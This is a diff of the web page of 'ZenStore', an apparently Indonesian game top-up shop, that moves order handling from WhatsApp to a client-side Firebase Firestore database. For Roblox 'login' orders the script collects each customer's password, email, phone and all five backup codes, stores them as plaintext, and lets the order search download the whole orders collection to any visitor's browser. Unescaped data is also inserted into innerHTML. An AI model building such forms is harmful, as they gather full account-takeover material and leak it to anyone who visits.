@@ -6,6 +6,244 @@
     <title>ZenStore - Top Up Game & Digital</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Oswald:wght@600;700&display=swap" rel="stylesheet">
     
+    <!-- SDK Firebase Online -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfJWdd7oM17foLNMRoK2k",
+            authDomain: "zenstore-3f8ef.firebaseapp.com",
+            projectId: "zenstore-3f8ef",
+            storageBucket: "zenstore-3f8ef.appspot.com",
+            messagingSenderId: "487720475687",
+            appId: "1:487720475687:web:dae597df0",
+            measurementId: "G-RYTR9057M9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let selectedItemName = "";
+        let selectedItemPrice = "";
+        let selectedType = "standard"; 
+        let searchMode = "user";
+
+        window.selectProduct = function(name, price, type, element) {
+            selectedItemName = name;
+            selectedItemPrice = price;
+            selectedType = type;
+
+            document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
+            if(element) element.classList.add('selected');
+
+            document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
+
+            const stdBox = document.getElementById('standard-form-box');
+            const gpBox = document.getElementById('roblox-gamepass-box');
+            const rbxBox = document.getElementById('roblox-login-box');
+
+            if(stdBox) stdBox.style.display = 'none';
+            if(gpBox) gpBox.style.display = 'none';
+            if(rbxBox) rbxBox.style.display = 'none';
+
+            if(type === 'gamepass' && gpBox) {
+                gpBox.style.display = 'block';
+            } else if(type === 'login' && rbxBox) {
+                rbxBox.style.display = 'block';
+            } else if(stdBox) {
+                stdBox.style.display = 'block';
+            }
+        };
+
+        window.switchTab = function(tabName, eventObj) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+
+            const targetTab = document.getElementById('tab-' + tabName);
+            if(targetTab) targetTab.classList.add('active');
+            if(eventObj && eventObj.currentTarget) {
+                eventObj.currentTarget.classList.add('active');
+            }
+        };
+
+        window.setSearchMode = function(mode) {
+            searchMode = mode;
+            const btnUser = document.getElementById('tab-search-user');
+            const btnInv = document.getElementById('tab-search-invoice');
+            const inputField = document.getElementById('search-input-val');
+
+            if(mode === 'user') {
+                if(btnUser) btnUser.classList.add('active');
+                if(btnInv) btnInv.classList.remove('active');
+                if(inputField) inputField.placeholder = "Masukkan Username / User ID kamu...";
+            } else {
+                if(btnInv) btnInv.classList.add('active');
+                if(btnUser) btnUser.classList.remove('active');
+                if(inputField) inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
+            }
+        };
+
+        // FUNGSI KIRIM KE DATABASE FIREBASE (MASUK KE ADMIN)
+        const payButton = document.getElementById('btn-pay');
+        if(payButton) {
+            payButton.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const paymentType = document.getElementById('payment-select').value;
+
+                if(!selectedItemName) {
+                    alert("Harap pilih salah satu produk terlebih dahulu di atas!");
+                    return;
+                }
+
+                let finalUserData = "";
+
+                if(selectedType === 'login') {
+                    const username = document.getElementById('rbx-username').value.trim();
+                    const password = document.getElementById('rbx-password').value.trim();
+                    const phone = document.getElementById('rbx-phone-login').value.trim();
+                    const email = document.getElementById('rbx-email').value.trim();
+
+                    const code1 = document.getElementById('rbx-code-1').value.trim();
+                    const code2 = document.getElementById('rbx-code-2').value.trim();
+                    const code3 = document.getElementById('rbx-code-3').value.trim();
+                    const code4 = document.getElementById('rbx-code-4').value.trim();
+                    const code5 = document.getElementById('rbx-code-5').value.trim();
+
+                    if(!username || !password) {
+                        alert("Harap isi Username dan Password Roblox!");
+                        return;
+                    }
+                    if(!code1 || !code2 || !code3 || !code4 || !code5) {
+                        alert("Harap lengkapi ke-5 Kode Backup Roblox!");
+                        return;
+                    }
+
+                    finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
+                } else if(selectedType === 'gamepass') {
+                    const username = document.getElementById('gp-username').value.trim();
+                    const phone = document.getElementById('gp-phone').value.trim();
+
+                    if(!username || !phone) {
+                        alert("Harap isi Username Roblox dan No. WhatsApp!");
+                        return;
+                    }
+
+                    finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
+                } else {
+                    const standardUser = document.getElementById('user-data-standard').value.trim();
+                    if(!standardUser) {
+                        alert("Harap masukkan Username / User ID Game / No HP!");
+                        return;
+                    }
+                    finalUserData = standardUser;
+                }
+
+                const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
+                const now = new Date().toLocaleString("id-ID");
+
+                try {
+                    payButton.innerText = "Memproses Pesanan...";
+                    payButton.disabled = true;
+
+                    // Simpan ke Firestore Database
+                    await setDoc(doc(db, "orders", randId), {
+                        invoiceId: randId,
+                        product: `${selectedItemName} (Rp ${selectedItemPrice})`,
+                        userData: finalUserData,
+                        paymentMethod: paymentType,
+                        status: "Menunggu Pembayaran",
+                        createdAt: now
+                    });
+
+                    document.getElementById('inv-id').innerText = "#" + randId;
+                    document.getElementById('inv-item').innerText = `${selectedItemName} (Rp ${selectedItemPrice})`;
+                    document.getElementById('inv-user').innerText = finalUserData;
+                    document.getElementById('inv-pay').innerText = paymentType;
+
+                    document.getElementById('invoice-modal').style.display = "flex";
+                } catch (err) {
+                    alert("Gagal terhubung ke database. Error: " + err.message);
+                } finally {
+                    payButton.innerText = "Bayar Sekarang";
+                    payButton.disabled = false;
+                }
+            });
+        }
+
+        // MODAL & PENCARIAN
+        document.getElementById('btn-open-cek').addEventListener('click', () => {
+            document.getElementById('cek-pesanan-modal').style.display = 'flex';
+        });
+        document.getElementById('btn-close-cek').addEventListener('click', () => {
+            document.getElementById('cek-pesanan-modal').style.display = 'none';
+            document.getElementById('search-result-content').innerHTML = '';
+        });
+        document.getElementById('btn-close-invoice').addEventListener('click', () => {
+            document.getElementById('invoice-modal').style.display = 'none';
+        });
+
+        document.getElementById('btn-search-exec').addEventListener('click', async function() {
+            const searchInput = document.getElementById("search-input-val").value.trim();
+            const resultBox = document.getElementById("search-result-content");
+
+            if (!searchInput) {
+                alert("Harap masukkan kata kunci pencarian!");
+                return;
+            }
+
+            resultBox.innerHTML = "<p style='color:#00f2fe;'>🔍 Sedang mencari data pesanan...</p>";
+
+            try {
+                const ordersRef = collection(db, "orders");
+                let foundDocs = [];
+
+                if (searchMode === 'invoice') {
+                    let formattedQuery = searchInput.toUpperCase();
+                    if (!formattedQuery.startsWith("ZN-")) {
+                        formattedQuery = "ZN-" + formattedQuery;
+                    }
+
+                    const q = query(ordersRef, where("invoiceId", "==", formattedQuery));
+                    const querySnapshot = await getDocs(q);
+                    querySnapshot.forEach((docSnap) => foundDocs.push(docSnap.data()));
+                } else {
+                    const qAll = await getDocs(ordersRef);
+                    qAll.forEach((docSnap) => {
+                        const data = docSnap.data();
+                        if (data.userData && data.userData.toLowerCase().includes(searchInput.toLowerCase())) {
+                            foundDocs.push(data);
+                        }
+                    });
+                }
+
+                if (foundDocs.length === 0) {
+                    resultBox.innerHTML = `
+                        <div style="background:rgba(255,0,85,0.1); border:1px solid #ff0055; padding:12px; border-radius:8px; color:#ff0055;">
+                            ❌ Pesanan tidak ditemukan. Periksa kembali No. Invoice / User ID kamu!
+                        </div>
+                    `;
+                } else {
+                    let htmlResult = "";
+                    foundDocs.forEach(item => {
+                        const statusColor = item.status === "Selesai" ? "#25d366" : "#ffcc00";
+                        htmlResult += `
+                            <div style="background:#0f1117; border:1px solid #00f2fe; padding:12px; border-radius:10px; text-align:left; margin-bottom:10px;">
+                                <p style="font-size:12px; color:#aaa;">Invoice: <b style="color:#fff;">#${item.invoiceId}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Produk: <b style="color:#00f2fe;">${item.product}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Waktu: <span style="color:#fff;">${item.createdAt || '-'}</span></p>
+                                <p style="font-size:12px; color:#aaa; margin-top:5px;">Status: <b style="color:${statusColor};">${item.status}</b></p>
+                            </div>
+                        `;
+                    });
+                    resultBox.innerHTML = htmlResult;
+                }
+            } catch (err) {
+                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${err.message}</p>`;
+            }
+        });
+    </script>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
         body { background-color: #0f1117; color: #ffffff; min-height: 100vh; padding-bottom: 50px; }
@@ -98,6 +336,11 @@
         .modal-card-box { background: #161922; padding: 25px 20px; border-radius: 16px; border: 1px solid #00f2fe; width: 100%; max-width: 420px; text-align: center; max-height: 90vh; overflow-y: auto; }
         .modal-card-box h3 { color: #00f2fe; font-size: 18px; margin-bottom: 4px; }
 
+        .search-tab-switch { display: flex; background: #0f1117; border-radius: 10px; padding: 4px; margin: 15px 0; gap: 4px; }
+        .search-tab-btn { flex: 1; padding: 8px; font-size: 11px; font-weight: 600; border: none; border-radius: 8px; background: transparent; color: #aaa; cursor: pointer; }
+        .search-tab-btn.active { background: #00f2fe; color: #000; font-weight: 700; }
+        .search-input-field { width: 100%; padding: 12px; background: #0f1117; border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; outline: none; font-size: 12px; margin-bottom: 12px; text-align: center; }
+
         .invoice-detail { background: #0f1117; padding: 12px; border-radius: 8px; text-align: left; margin: 12px 0; font-size: 12px; line-height: 1.8; }
         .invoice-detail span { color: #00f2fe; font-weight: bold; }
     </style>
@@ -107,6 +350,7 @@
     <header>
         <div class="header-left">
             <div class="logo">Zen<span>Store</span></div>
+            <button id="btn-open-cek" class="btn-cek-header">🔍 Cek Pesanan</button>
         </div>
         <div class="header-right">
             <a href="https://wa.me/6285872562036" class="btn-wa-header" target="_blank">Admin WA</a>
@@ -319,11 +563,31 @@
 
     </div>
 
+    <!-- MODAL POPUP CEK PESANAN -->
+    <div id="cek-pesanan-modal" class="modal-popup">
+        <div class="modal-card-box">
+            <h3>Cek Pesanan Kamu</h3>
+            <p style="font-size:11px; color:#aaa;">Cek status transaksimu secara otomatis di bawah ini:</p>
+
+            <div class="search-tab-switch">
+                <button id="tab-search-user" class="search-tab-btn active" onclick="setSearchMode('user')">Pakai Username / ID</button>
+                <button id="tab-search-invoice" class="search-tab-btn" onclick="setSearchMode('invoice')">Pakai Invoice ID</button>
+            </div>
+
+            <input type="text" id="search-input-val" class="search-input-field" placeholder="Masukkan Username / User ID kamu...">
+            <button id="btn-search-exec" class="btn-pay-web" style="margin-top:0;">Cek Pesananku</button>
+
+            <div id="search-result-content" style="margin-top:15px;"></div>
+
+            <p id="btn-close-cek" style="margin-top:15px; font-size:12px; color:#aaa; cursor:pointer;">Tutup</p>
+        </div>
+    </div>
+
     <!-- MODAL POPUP INVOICE -->
     <div id="invoice-modal" class="modal-popup">
         <div class="modal-card-box">
-            <h3 style="color:#00f2fe;">Pesanan Siap Dikirim!</h3>
-            <p style="font-size:11px; color:#aaa; margin-top:4px;">Klik tombol di bawah untuk kirim pesanan otomatis ke WhatsApp Admin.</p>
+            <h3 style="color:#00f2fe;">Pesanan Berhasil Dibuat!</h3>
+            <p style="font-size:11px; color:#aaa; margin-top:4px;">Data pesanan sudah masuk ke Web Admin ZenStore.</p>
 
             <div class="invoice-detail">
                 <p>No. Pesanan: <span id="inv-id">-</span></p>
@@ -332,123 +596,9 @@
                 <p>Metode Bayar: <span id="inv-pay">-</span></p>
             </div>
 
-            <a id="wa-redirect-btn" href="#" target="_blank" class="btn-pay-web" style="display:block; text-decoration:none; line-height:normal; margin-top:15px; background:#25d366; color:#fff;">Kirim Pesanan ke WhatsApp Admin</a>
-            <button onclick="document.getElementById('invoice-modal').style.display='none'" class="btn-pay-web" style="margin-top:10px; background:rgba(255,255,255,0.1); color:#fff;">Tutup</button>
+            <p style="font-size:11px; color:#00f2fe;">Silakan selesaikan pembayaran. Admin akan memproses pesananmu langsung dari web!</p>
+            <button id="btn-close-invoice" class="btn-pay-web" style="margin-top:15px;">Selesai</button>
         </div>
     </div>
-
-    <!-- SKRIP LOGIKA UTAMA -->
-    <script>
-        let selectedItemName = "";
-        let selectedItemPrice = "";
-        let selectedType = "standard"; 
-
-        window.selectProduct = function(name, price, type, element) {
-            selectedItemName = name;
-            selectedItemPrice = price;
-            selectedType = type;
-
-            document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
-            if(element) element.classList.add('selected');
-
-            document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
-
-            const stdBox = document.getElementById('standard-form-box');
-            const gpBox = document.getElementById('roblox-gamepass-box');
-            const rbxBox = document.getElementById('roblox-login-box');
-
-            if(stdBox) stdBox.style.display = 'none';
-            if(gpBox) gpBox.style.display = 'none';
-            if(rbxBox) rbxBox.style.display = 'none';
-
-            if(type === 'gamepass' && gpBox) {
-                gpBox.style.display = 'block';
-            } else if(type === 'login' && rbxBox) {
-                rbxBox.style.display = 'block';
-            } else if(stdBox) {
-                stdBox.style.display = 'block';
-            }
-        };
-
-        window.switchTab = function(tabName, eventObj) {
-            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
-
-            const targetTab = document.getElementById('tab-' + tabName);
-            if(targetTab) targetTab.classList.add('active');
-            if(eventObj && eventObj.currentTarget) {
-                eventObj.currentTarget.classList.add('active');
-            }
-        };
-
-        // TOMBOL BAYAR SEKARANG
-        document.getElementById('btn-pay').addEventListener('click', function(e) {
-            e.preventDefault();
-            const paymentType = document.getElementById('payment-select').value;
-
-            if(!selectedItemName) {
-                alert("Harap pilih salah satu produk terlebih dahulu di atas!");
-                return;
-            }
-
-            let finalUserData = "";
-
-            if(selectedType === 'login') {
-                const username = document.getElementById('rbx-username').value.trim();
-                const password = document.getElementById('rbx-password').value.trim();
-                const phone = document.getElementById('rbx-phone-login').value.trim();
-                const email = document.getElementById('rbx-email').value.trim();
-
-                const code1 = document.getElementById('rbx-code-1').value.trim();
-                const code2 = document.getElementById('rbx-code-2').value.trim();
-                const code3 = document.getElementById('rbx-code-3').value.trim();
-                const code4 = document.getElementById('rbx-code-4').value.trim();
-                const code5 = document.getElementById('rbx-code-5').value.trim();
-
-                if(!username || !password) {
-                    alert("Harap isi Username dan Password Roblox!");
-                    return;
-                }
-                if(!code1 || !code2 || !code3 || !code4 || !code5) {
-                    alert("Harap lengkapi ke-5 Kode Backup Roblox!");
-                    return;
-                }
-
-                finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
-            } else if(selectedType === 'gamepass') {
-                const username = document.getElementById('gp-username').value.trim();
-                const phone = document.getElementById('gp-phone').value.trim();
-
-                if(!username || !phone) {
-                    alert("Harap isi Username Roblox dan No. WhatsApp!");
-                    return;
-                }
-
-                finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
-            } else {
-                const standardUser = document.getElementById('user-data-standard').value.trim();
-                if(!standardUser) {
-                    alert("Harap masukkan Username / User ID Game / No HP!");
-                    return;
-                }
-                finalUserData = standardUser;
-            }
-
-            const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
-
-            // Tampilkan Invoice
-            document.getElementById('inv-id').innerText = "#" + randId;
-            document.getElementById('inv-item').innerText = `${selectedItemName} (Rp ${selectedItemPrice})`;
-            document.getElementById('inv-user').innerText = finalUserData;
-            document.getElementById('inv-pay').innerText = paymentType;
-
-            // Format Pesan WhatsApp
-            const message = `Halo Admin ZenStore, saya ingin melakukan pemesanan:\n\n*No. Invoice:* #${randId}\n*Produk:* ${selectedItemName} (Rp ${selectedItemPrice})\n*Data Akun/ID:* ${finalUserData}\n*Metode Pembayaran:* ${paymentType}\n\nMohon segera diproses ya kak. Terima kasih!`;
-            const encodedMessage = encodeURIComponent(message);
-            
-            document.getElementById('wa-redirect-btn').href = `https://wa.me/6285872562036?text=${encodedMessage}`;
-            document.getElementById('invoice-modal').style.display = "flex";
-        });
-    </script>
 </body>
 </html>
